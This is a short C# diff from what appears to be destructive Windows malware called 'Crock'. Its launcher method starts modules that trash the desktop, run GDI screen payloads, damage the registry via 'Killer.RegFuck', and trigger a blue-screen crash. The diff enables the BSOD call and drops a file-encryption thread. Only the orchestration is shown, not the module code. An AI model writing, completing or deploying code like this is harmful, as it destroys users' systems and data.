@@ -3,7 +3,7 @@ using System.Security.Principal;
 
 namespace Crock
 {
-    static partial class Program
+    class Program
     {
         // Запус всех модулей
         public static void UseExp()
@@ -13,10 +13,9 @@ namespace Crock
             var rule = new Rules();
             new Thread(() => rule.ShowDialog()).Start();
             new Thread(() => Addition.TrashDestop()).Start();
-            new Thread(() => Crypt.Main_Encrypt()).Start();
             new Thread(() => Effect.GDI_payloads()).Start();
             Killer.RegFuck();
-            //Killer.BSOD();
+            Killer.BSOD();
         }
 
         private static void Main()
